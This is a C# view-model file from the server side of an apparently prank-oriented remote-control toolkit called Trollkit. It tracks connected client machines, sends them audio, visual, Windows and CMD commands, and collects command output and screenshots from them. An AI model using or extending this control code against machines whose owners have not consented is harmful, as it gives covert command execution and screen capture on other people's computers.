﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using Trollkit_Library.ClientModules;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;
using Trollkit_Library.ServerModules;
using Trollkit_Library.ViewModels.Commands;

namespace Trollkit_Library.ViewModels
{
	public class ServerViewModel : INotifyPropertyChanged
	{
		public static Server Server;

		public event PropertyChangedEventHandler PropertyChanged;

		//sub viewmodels
		public AudioCommands Audio { get; private set; }
		public VisualCommands Visual { get; private set; }
		public WindowsCommands Windows { get; private set; }
        public ClientCommands Client { get; private set; }

		public CMDCommands CMD { get; private set; }

		//model properties
		public List<Client> Clients { get { return Server.Clients; } }

		public Client SelectedClient
		{
			get
			{
				return Server.SelectedClient;
			}
			set
			{
				Server.SelectedClient = value;
				NotifyPropertyChanged("SelectedClient");
				NotifyPropertyChanged("CurrentClientName");
			}
		}

		public string CurrentClientName
		{
			get
			{
				if(Clients.Count == 0)
				{
					return "No Client selected";
				}
				else
				{
					if (AllClientsSelected)
					{
						return "All Clients selected";
					}
					else
					{
						//check if ComputerName exists
						if (SelectedClient.storedData.ContainsKey("ComputerName"))
						{
							return SelectedClient.storedData["ComputerName"];
						}
						else
						{
							return SelectedClient.ToString();
						}					
					}
				}
			}
		}


		public bool AllClientsSelected
		{
			get
			{
				if(Clients.Count == 0)
				{
					return true; //to disable the buttons that require atleast one client selected
				}

				return Server.AllClientsSelected;
			}
			set
			{
				Server.AllClientsSelected = value;
				NotifyPropertyChanged("AllClientsSelected");
				NotifyPropertyChanged("CurrentClientName");
			}
		}

		public bool ClientsAvailable { get { return Server.ClientsAvailable; } }

		public ServerViewModel()
		{
			Server = new Server(IPAddress.Any);
			Server.ClientConnected += Server_ClientConnected;
			Server.ClientDisconnected += Server_ClientDisconnected;
			Server.MessageReceived += Server_MessageReceived;
			Server.OnPropertyChanged += Server_OnPropertyChanged;
			Server.Start();

			Audio = new AudioCommands(Server, "Audio");
			Visual = new VisualCommands(Server, "Visuals");
			Windows = new WindowsCommands(Server, "Windows");
			Client = new ClientCommands(Server, "Client");
			CMD = new CMDCommands(Server, "CMD");

			Task.Run(() => new ServerDiscovery("gang?", "Dopple gang").Discover());
		}	

		private void Server_MessageReceived(Client c, TransferCommandObject model, Server.DataByteType type)
		{
			BConsole.WriteLine($"Client {c.GetName()} sent a message", ConsoleColor.DarkGray);

			switch (type)
			{
				case Server.DataByteType.Response:
					if(model.Command == "CMDResponse")
					{
						c.AddToCMDBuffer(model.Value);
					}		
					else if (model.Command == "ScreenshotResponse")
					{
						c.SetScreenshot(model.Value);
					}
					break;
				case Server.DataByteType.Command:
					if (model.Command == "Debug")
					{
						TransferCommandObject returnObject = new TransferCommandObject { Command = "PlayBeep", Handler = "Audio", Value = "200,300" };
						Server.SendDataObjectToSocket(Server.DataByteType.Command, Server.GetSocketByClient(c), ClientServerPipeline.BufferSerialize(returnObject));
					}
					break;
				case Server.DataByteType.Data:
					c.SetDataItem(model.Command, model.Value);
					NotifyPropertyChanged("SelectedClient.storedData");
					break;
			}			
		}

		private void Server_ClientDisconnected(Client c)
		{
			BConsole.WriteLine($"Client {c.GetName()} has disconnected!", ConsoleColor.Yellow);
			if (Server.SelectedClient == c)
			{
				Server.SelectedClient = Server.Clients.FirstOrDefault();
			}
			NotifyPropertyChanged("Clients");
			NotifyPropertyChanged("AllClientsSelected");
			NotifyPropertyChanged("ClientsAvailable");
			NotifyPropertyChanged("SelectedClient");
			NotifyPropertyChanged("CurrentClientName");
		}

		private void Server_ClientConnected(Client c)
		{
			BConsole.WriteLine($"Client {c.GetName()} has connected!", ConsoleColor.Yellow);
			if (Server.SelectedClient == null)
			{
				Server.SelectedClient = c;
			}
			NotifyPropertyChanged("Clients");
			NotifyPropertyChanged("AllClientsSelected");
			NotifyPropertyChanged("ClientsAvailable");
			NotifyPropertyChanged("SelectedClient");
			NotifyPropertyChanged("CurrentClientName");
		}

		private void Server_OnPropertyChanged(string Property)
		{
			NotifyPropertyChanged(Property);
		}

		/// <summary>
		/// The important notifier method of changed properties. This function should be called whenever you want to inform other classes that some property has changed.
		/// </summary>
		/// <param name="propertyName">The name of the updated property. Leaving this blank will fill in the name of the calling property.</param>
		private void NotifyPropertyChanged([CallerMemberName] String propertyName = "")
		{
			PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
		}
	}
}
